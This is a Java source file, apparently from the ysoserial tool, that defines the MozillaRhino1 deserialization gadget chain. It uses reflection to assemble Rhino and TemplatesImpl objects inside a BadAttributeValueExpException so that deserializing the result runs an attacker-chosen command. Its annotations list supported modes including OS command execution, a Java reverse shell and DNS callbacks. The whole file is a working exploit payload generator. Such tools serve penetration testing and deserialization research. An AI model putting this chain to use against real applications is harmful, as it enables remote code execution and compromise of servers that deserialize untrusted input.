package ysoserial.payloads;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import javax.management.BadAttributeValueExpException;

import org.mozilla.javascript.Context;
import org.mozilla.javascript.IdScriptableObject;
import org.mozilla.javascript.NativeJavaMethod;
import org.mozilla.javascript.NativeJavaObject;
import org.mozilla.javascript.NativeObject;
import org.mozilla.javascript.ScriptableObject;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicCommands;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"rhino:js:1.7R2"})
@Authors({ Authors.MATTHIASKAISER })
@DynamicCommands({DynamicCommands.EXEC_GLOBAL, DynamicCommands.EXEC_WIN, DynamicCommands.EXEC_UNIX, DynamicCommands.JAVA_REVERSE_SHELL, DynamicCommands.SLEEP, DynamicCommands.DNS})
public class MozillaRhino1 implements ObjectPayload<Object> {

    public Object getObject(final String command, final String attackType) throws Exception {

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        Reflections.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        Reflections.setAccessible(getSlot);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field getter = slot.getClass().getDeclaredField("getter");
        Reflections.setAccessible(getter);

        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        Reflections.setAccessible(memberboxClassConstructor);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command, attackType), TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(valField);
        valField.set(badAttributeValueExpException, idScriptableObject);

        return badAttributeValueExpException;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino1.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
